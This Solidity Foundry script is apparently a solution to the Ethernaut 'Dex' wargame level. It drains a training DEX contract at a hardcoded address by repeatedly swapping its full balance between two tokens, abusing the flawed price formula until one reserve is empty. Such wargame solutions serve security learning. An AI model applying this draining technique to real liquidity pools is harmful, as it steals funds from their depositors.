// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {Telephone} from "../../src/Ethernaut/Telephone.sol";
import {Dex} from "../../src/Ethernaut/Dex.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Dex dex = Dex(0x3d5082AD3971A263516C28dF6C637a8392a450E7);
        dex.approve(address(dex), UINT256_MAX);
        address token1 = dex.token1();
        address token2 = dex.token2();
        while (true) {
            uint256 playerToken1balance = dex.balanceOf(
                token1,
                0xB3D6fac08D421164A414970D5225845b3A91F33F
            );
            uint256 dexToken1balance = dex.balanceOf(token1, address(dex));
            uint256 dexToken2balance = dex.balanceOf(token2, address(dex));

            uint256 swapAmount = dex.getSwapPrice(
                token1,
                token2,
                playerToken1balance
            );
            if (swapAmount > dexToken2balance) {
                swapAmount = dexToken1balance;
            }

            dex.swap(
                token1,
                token2,
                playerToken1balance < swapAmount
                    ? playerToken1balance
                    : swapAmount
            );

            if (dex.balanceOf(token2, address(dex)) == 0) {
                break;
            }

            (token1, token2) = (token2, token1);
        }
        vm.stopBroadcast();
    }
}
